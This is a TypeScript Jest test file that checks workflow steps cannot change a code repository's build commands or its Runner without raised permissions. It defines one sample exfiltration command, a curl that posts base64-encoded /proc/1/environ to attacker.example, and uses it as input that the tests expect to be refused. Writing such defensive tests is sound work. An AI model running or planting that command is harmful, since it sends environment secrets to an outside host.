import CodeRepository from "../../../../../Models/DatabaseModels/CodeRepository";
import CodeRepositoryService, {
  Service as CodeRepositoryServiceClass,
} from "../../../../../Server/Services/CodeRepositoryService";
import ProjectService from "../../../../../Server/Services/ProjectService";
import RunnerService from "../../../../../Server/Services/RunnerService";
import WorkflowSecretChangeRefusedException from "../../../../../Server/Types/Database/Permissions/WorkflowSecretChangeRefusedException";
import ComponentCode, {
  RunOptions,
  RunReturnType,
} from "../../../../../Server/Types/Workflow/ComponentCode";
import CreateOneBaseModel from "../../../../../Server/Types/Workflow/Components/BaseModel/CreateOneBaseModel";
import UpdateManyBaseModel from "../../../../../Server/Types/Workflow/Components/BaseModel/UpdateManyBaseModel";
import UpdateOneBaseModel from "../../../../../Server/Types/Workflow/Components/BaseModel/UpdateOneBaseModel";
import ProjectReferenceCheck from "../../../../../Server/Utils/Database/ProjectReferenceCheck";
import WorkflowPrincipal, {
  WorkflowRunAsGrant,
} from "../../../../../Server/Utils/Workflow/WorkflowPrincipal";
import DatabaseCommonInteractionProps from "../../../../../Types/BaseDatabase/DatabaseCommonInteractionProps";
import { getDefaultWorkflowRunnerWorkRefusal } from "../../../../../Types/CodeRepository/CodeRepositoryRunnerAuthoring";
import CodeRepositoryType from "../../../../../Types/CodeRepository/CodeRepositoryType";
import PermissionScope from "../../../../../Types/Database/AccessControl/PermissionScope";
import { PlanType } from "../../../../../Types/Billing/SubscriptionPlan";
import Exception from "../../../../../Types/Exception/Exception";
import { JSONObject } from "../../../../../Types/JSON";
import ObjectID from "../../../../../Types/ObjectID";
import Permission, { UserPermission } from "../../../../../Types/Permission";
import { WorkflowRunAs } from "../../../../../Types/Workflow/WorkflowRunAs";
import { setTestBillingEnabled } from "../../../Enterprise/TestBillingFlag";
import {
  InMemoryTable,
  useInMemoryTable,
} from "../../../TestingUtils/InMemoryRepository";
import { ON_HIGHEST_PLAN } from "../../../TestingUtils/RequestPlan";
import { getJestSpyOn } from "../../../../Spy";
import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";

jest.mock("../../../../../Server/Utils/Logger");

jest.mock("../../../../../Server/EnvironmentConfig", () => {
  const billingFlag: typeof import("../../../Enterprise/TestBillingFlag") =
    jest.requireActual(
      "../../../Enterprise/TestBillingFlag",
    ) as typeof import("../../../Enterprise/TestBillingFlag");

  return billingFlag.withLiveBillingFlag(
    jest.requireActual("../../../../../Server/EnvironmentConfig") as Record<
      string,
      unknown
    >,
  );
});

/*
 * A PROJECT MEMBER'S WORKFLOW CANNOT CHANGE WHAT A PROJECT'S RUNNER RUNS.
 *
 * A code repository's setup, build and test commands run on a Runner of the
 * project's own, and its Runner setting decides which. Writing them takes
 * what writing a runbook's steps that run takes (Types/CodeRepository/
 * CodeRepositoryRunnerAuthoring) - Project Admin among it. A workflow that
 * runs with the default permissions acts as a Project Admin, and a Project
 * Member may build one: so a member's "Update One Code Repository" step
 * would have set the command a member may not, and the Runner would have
 * run it with its own access. The real generated steps, the real services
 * and the real permission checks, over tables in memory:
 *
 *   - a default step that sets, clears or moves any of them is refused,
 *     saying why and what would let the workflow, and writes nothing - an
 *     update, an update of many, and a create that sets one;
 *   - the same steps change the repository's other settings, and create a
 *     repository that runs nothing of its own, as before;
 *   - a workflow a person gave Project Owner, or a custom role holding
 *     Edit Runbook beside the repository's own permissions, writes them; a
 *     custom role with the repository's permissions alone does not.
 */

const PLAN_ENVIRONMENT: Record<string, string> = {
  SUBSCRIPTION_PLAN_BASIC: "Free,price_free_month,price_free_year,0,0,1,0",
  SUBSCRIPTION_PLAN_GROWTH:
    "Growth,price_growth_month,price_growth_year,22,20,2,14",
  SUBSCRIPTION_PLAN_SCALE:
    "Scale,price_scale_month,price_scale_year,99,84,3,14",
  SUBSCRIPTION_PLAN_ENTERPRISE:
    "Enterprise,price_enterprise_month,price_enterprise_year,-1,-1,4,14",
};

const PROJECT_ID: ObjectID = new ObjectID(
  "7e000000-0000-4000-8000-000000000002",
);
const GIVER_ID: ObjectID = new ObjectID("7e000000-0000-4000-8000-0000000000a2");
const REPOSITORY_ID: string = "7e000000-0000-4000-8000-0000000000f1";
const CI_RUNNER_ID: string = "7e000000-0000-4000-8000-0000000000f2";
const PROD_RUNNER_ID: string = "7e000000-0000-4000-8000-0000000000f3";

const HOSTILE_COMMAND: string =
  'curl -s https://attacker.example/c -d "$(cat /proc/1/environ | base64)"';

const OWNER_RUN: WorkflowRunAsGrant = {
  runAs: WorkflowRunAs.ProjectOwner,
  givenByUserId: GIVER_ID,
  givenByName: "Jane Doe",
};

function row(permission: Permission): UserPermission {
  return {
    _type: "UserPermission",
    permission: permission,
    labelIds: [],
    scope: PermissionScope.All,
    isBlockPermission: false,
  };
}

function roleRun(permissions: Array<Permission>): WorkflowRunAsGrant {
  return {
    runAs: WorkflowRunAs.CustomRole,
    customRoleId: ObjectID.generate(),
    customRoleName: "Build Settings",
    rolePermissions: permissions.map(row),
    givenByUserId: GIVER_ID,
    givenByName: "Jane Doe",
  };
}

interface StepRun {
  result: RunReturnType;
  lines: Array<string>;
}

function options(
  lines: Array<string>,
  runAs?: WorkflowRunAsGrant | undefined,
): RunOptions {
  return {
    log: ((line: unknown): void => {
      lines.push(typeof line === "string" ? line : JSON.stringify(line));
    }) as RunOptions["log"],
    workflowLogId: ObjectID.generate(),
    workflowId: ObjectID.generate(),
    workflowName: "Member's automation",
    projectId: PROJECT_ID,
    runAs: runAs,
    onError: ((exception: Exception): Exception => {
      return exception;
    }) as RunOptions["onError"],
    executeWorkflow: async (): Promise<void> => {},
  };
}

async function run(
  component: ComponentCode,
  args: JSONObject,
  runAs?: WorkflowRunAsGrant | undefined,
): Promise<StepRun> {
  const lines: Array<string> = [];
  const result: RunReturnType = await component.run(
    args,
    options(lines, runAs),
  );
  return { result, lines };
}

function stepProps(
  runAs?: WorkflowRunAsGrant | undefined,
): DatabaseCommonInteractionProps {
  return {
    ...WorkflowPrincipal.getPropsWithoutPlan({
      projectId: PROJECT_ID,
      workflowId: ObjectID.generate(),
      workflowName: "Member's automation",
      runAs: runAs,
    }),
    ...ON_HIGHEST_PLAN,
  };
}

function expectRefused(
  step: ComponentCode,
  stepRun: StepRun,
  isCreate: boolean,
): void {
  const expected: string = `"${step.getMetadata().title}" was refused. ${getDefaultWorkflowRunnerWorkRefusal(
    { isCreate },
  )}`;

  expect(stepRun.result.executePort?.id).toBe("error");
  expect(stepRun.lines).toContain(expected);
  expect(stepRun.result.executePortReason).toBe(expected);
}

function expectRan(stepRun: StepRun): void {
  expect({
    port: stepRun.result.executePort?.id,
    reason: stepRun.result.executePortReason,
  }).toEqual({ port: "success", reason: undefined });
}

const savedPlanEnvironment: Record<string, string | undefined> = {};
let repositories: InMemoryTable;

function repository(): Record<string, unknown> {
  return repositories.get(REPOSITORY_ID) as Record<string, unknown>;
}

function writes(): number {
  return (
    repositories.updates.length +
    repositories.inserts.length +
    repositories.deletes.length
  );
}

beforeAll(() => {
  for (const key of Object.keys(process.env)) {
    if (key.startsWith("SUBSCRIPTION_PLAN_")) {
      savedPlanEnvironment[key] = process.env[key];
      delete process.env[key];
    }
  }

  Object.assign(process.env, PLAN_ENVIRONMENT);
});

afterAll(() => {
  for (const key of Object.keys(PLAN_ENVIRONMENT)) {
    delete process.env[key];
  }

  for (const [key, value] of Object.entries(savedPlanEnvironment)) {
    if (value !== undefined) {
      process.env[key] = value;
    }
  }
});

beforeEach(() => {
  // As on OneUptime Cloud, on a plan that sells code repositories.
  setTestBillingEnabled(true);

  getJestSpyOn(ProjectService, "getCurrentPlan").mockImplementation(
    (async () => {
      return { plan: PlanType.Enterprise, isSubscriptionUnpaid: false };
    }) as never,
  );

  /*
   * The cross-project reference check (that the Runner a write names is
   * this project's) is a defence of its own, with its own tests; the rows
   * here are all this project's.
   */
  getJestSpyOn(ProjectReferenceCheck, "validateCreate").mockResolvedValue(
    undefined as never,
  );
  getJestSpyOn(ProjectReferenceCheck, "validateUpdate").mockResolvedValue(
    undefined as never,
  );

  getJestSpyOn(CodeRepositoryService, "onTriggerRealtime").mockResolvedValue(
    undefined as never,
  );

  repositories = useInMemoryTable(CodeRepositoryService, [
    {
      _id: REPOSITORY_ID,
      projectId: PROJECT_ID.toString(),
      name: "payments-api",
      slug: "payments-api",
      repositoryHostedAt: CodeRepositoryType.GitHub,
      organizationName: "acme",
      repositoryName: "payments-api",
      mainBranchName: "main",
      setupCommand: "npm ci",
      buildCommand: null,
      testCommand: "npm test",
      runnerId: CI_RUNNER_ID,
      isGlobalRunnerPicked: null,
      version: 1,
    },
  ]);

  useInMemoryTable(RunnerService, [
    {
      _id: CI_RUNNER_ID,
      projectId: PROJECT_ID.toString(),
      name: "ci-runner",
      key: "7e000000-0000-4000-8000-0000000000f4",
      canRunRunbooks: true,
      isGlobalRunner: false,
      isProjectDefault: false,
    },
    {
      _id: PROD_RUNNER_ID,
      projectId: PROJECT_ID.toString(),
      name: "prod-eu-west-1",
      key: "7e000000-0000-4000-8000-0000000000f5",
      canRunRunbooks: true,
      isGlobalRunner: false,
      isProjectDefault: false,
    },
  ]);
});

afterEach(() => {
  jest.restoreAllMocks();
  setTestBillingEnabled(false);
});

describe("a project member's workflow cannot change what a Runner runs for a repository", () => {
  test.each([
    ["setting the report's setup command", { setupCommand: HOSTILE_COMMAND }],
    ["setting a build command", { buildCommand: "make" }],
    ["clearing the test command", { testCommand: null }],
    ["pointing it at the production Runner", { runnerId: PROD_RUNNER_ID }],
    ["clearing its Runner", { runnerId: null }],
    ["moving it to the Global Runner", { isGlobalRunnerPicked: true }],
  ])(
    '"Update One Code Repository" %s is refused, and the repository is as it was',
    async (_what: string, data: JSONObject) => {
      const component: UpdateOneBaseModel<CodeRepository> =
        new UpdateOneBaseModel<CodeRepository>(CodeRepositoryService);

      const step: StepRun = await run(component, {
        query: { _id: REPOSITORY_ID },
        data: data,
      });

      expectRefused(component, step, false);
      expect(writes()).toBe(0);
      expect(repository()).toMatchObject({
        setupCommand: "npm ci",
        buildCommand: null,
        testCommand: "npm test",
        runnerId: CI_RUNNER_ID,
        isGlobalRunnerPicked: null,
      });
    },
  );

  test('"Update Many Code Repositories" setting a command on every repository is refused', async () => {
    const component: UpdateManyBaseModel<CodeRepository> =
      new UpdateManyBaseModel<CodeRepository>(CodeRepositoryService);

    const step: StepRun = await run(component, {
      query: {},
      data: { setupCommand: HOSTILE_COMMAND },
    });

    expect(step.result.executePort?.id).toBe("error");
    expect(step.result.executePortReason).toContain(
      getDefaultWorkflowRunnerWorkRefusal({ isCreate: false }),
    );
    expect(writes()).toBe(0);
    expect(repository()["setupCommand"]).toBe("npm ci");
  });

  test('"Create One Code Repository" with a command, or a Runner, is refused, and none is created', async () => {
    for (const json of [
      { testCommand: HOSTILE_COMMAND },
      { runnerId: PROD_RUNNER_ID },
    ]) {
      const component: CreateOneBaseModel<CodeRepository> =
        new CreateOneBaseModel<CodeRepository>(CodeRepositoryService);

      const step: StepRun = await run(component, {
        json: {
          name: "checkout-service",
          repositoryHostedAt: CodeRepositoryType.GitHub,
          organizationName: "acme",
          repositoryName: "checkout-service",
          ...json,
        },
      });

      expectRefused(component, step, true);
    }

    expect(repositories.inserts).toEqual([]);
    expect(repositories.rows).toHaveLength(1);
  });
});

describe("what a project member's workflow still does with a repository", () => {
  test('"Update One Code Repository" changes its other settings', async () => {
    const component: UpdateOneBaseModel<CodeRepository> =
      new UpdateOneBaseModel<CodeRepository>(CodeRepositoryService);

    const step: StepRun = await run(component, {
      query: { _id: REPOSITORY_ID },
      data: { description: "Checkout and payments", mainBranchName: "trunk" },
    });

    expectRan(step);
    expect(repository()).toMatchObject({
      description: "Checkout and payments",
      mainBranchName: "trunk",
      setupCommand: "npm ci",
    });
  });

  test('"Create One Code Repository" creates one that runs nothing of its own', async () => {
    const component: CreateOneBaseModel<CodeRepository> =
      new CreateOneBaseModel<CodeRepository>(CodeRepositoryService);

    const step: StepRun = await run(component, {
      json: {
        name: "checkout-service",
        repositoryHostedAt: CodeRepositoryType.GitHub,
        organizationName: "acme",
        repositoryName: "checkout-service",
      },
    });

    expectRan(step);
    expect(repositories.inserts).toHaveLength(1);
  });
});

describe("a workflow a person raised writes what a Runner runs as far as it may", () => {
  test("run as Project Owner, it sets a command and picks a Runner", async () => {
    const component: UpdateOneBaseModel<CodeRepository> =
      new UpdateOneBaseModel<CodeRepository>(CodeRepositoryService);

    const step: StepRun = await run(
      component,
      {
        query: { _id: REPOSITORY_ID },
        data: { testCommand: "npm run test:ci", runnerId: PROD_RUNNER_ID },
      },
      OWNER_RUN,
    );

    expectRan(step);
    expect(repository()["testCommand"]).toBe("npm run test:ci");
    expect(String(repository()["runnerId"]).toLowerCase()).toBe(PROD_RUNNER_ID);
  });

  test("run as a custom role with Edit Runbook beside the repository's own permissions, it sets a command", async () => {
    const component: UpdateOneBaseModel<CodeRepository> =
      new UpdateOneBaseModel<CodeRepository>(CodeRepositoryService);

    const step: StepRun = await run(
      component,
      {
        query: { _id: REPOSITORY_ID },
        data: { buildCommand: "npm run build" },
      },
      roleRun([
        Permission.EditRunbook,
        Permission.EditCodeRepository,
        Permission.ReadCodeRepository,
      ]),
    );

    expectRan(step);
    expect(repository()["buildCommand"]).toBe("npm run build");
  });

  test("run as a custom role with the repository's own permissions alone, it sets none", async () => {
    const component: UpdateOneBaseModel<CodeRepository> =
      new UpdateOneBaseModel<CodeRepository>(CodeRepositoryService);

    const step: StepRun = await run(
      component,
      {
        query: { _id: REPOSITORY_ID },
        data: { buildCommand: "npm run build" },
      },
      roleRun([Permission.EditCodeRepository, Permission.ReadCodeRepository]),
    );

    expect(step.result.executePort?.id).toBe("error");
    expect(writes()).toBe(0);
    expect(repository()["buildCommand"]).toBeNull();
  });
});

describe("assertWorkflowDoesNotWriteWhatRunnersRun", () => {
  test("refuses a default step's update of any of the columns, a clearing included", () => {
    for (const data of [
      { setupCommand: "x" },
      { buildCommand: null },
      { testCommand: "" },
      { runner: { _id: PROD_RUNNER_ID } },
      { runnerId: null },
      { isGlobalRunnerPicked: false },
    ]) {
      expect(() => {
        CodeRepositoryServiceClass.assertWorkflowDoesNotWriteWhatRunnersRun({
          data: data,
          props: stepProps(),
          isCreate: false,
        });
      }).toThrow(WorkflowSecretChangeRefusedException);
    }
  });

  test("a default step's create that sets none passes, one that sets one does not", () => {
    expect(() => {
      CodeRepositoryServiceClass.assertWorkflowDoesNotWriteWhatRunnersRun({
        data: { name: "x", setupCommand: null, runnerId: null },
        props: stepProps(),
        isCreate: true,
      });
    }).not.toThrow();

    expect(() => {
      CodeRepositoryServiceClass.assertWorkflowDoesNotWriteWhatRunnersRun({
        data: { name: "x", setupCommand: "npm ci" },
        props: stepProps(),
        isCreate: true,
      });
    }).toThrow(
      new WorkflowSecretChangeRefusedException(
        getDefaultWorkflowRunnerWorkRefusal({ isCreate: true }),
      ),
    );
  });

  test("a raised workflow, a person, and a write of other columns are not asked", () => {
    const writesSetupCommand: JSONObject = { setupCommand: "npm ci" };

    for (const props of [
      stepProps(OWNER_RUN),
      stepProps(roleRun([Permission.EditRunbook])),
      { isRoot: true },
      {
        tenantId: PROJECT_ID,
        userId: GIVER_ID,
      } as DatabaseCommonInteractionProps,
    ]) {
      expect(() => {
        CodeRepositoryServiceClass.assertWorkflowDoesNotWriteWhatRunnersRun({
          data: writesSetupCommand,
          props: props,
          isCreate: false,
        });
      }).not.toThrow();
    }

    expect(() => {
      CodeRepositoryServiceClass.assertWorkflowDoesNotWriteWhatRunnersRun({
        data: { name: "renamed", description: "npm ci" },
        props: stepProps(),
        isCreate: false,
      });
    }).not.toThrow();
  });

  test("a default step acts as a Project Admin, who may write them as a person - which is why it is asked", () => {
    expect(WorkflowPrincipal.PERMISSION).toBe(Permission.ProjectAdmin);
    expect(CodeRepositoryServiceClass.getRunnerWorkWriters()).toContain(
      Permission.ProjectAdmin,
    );
  });
});
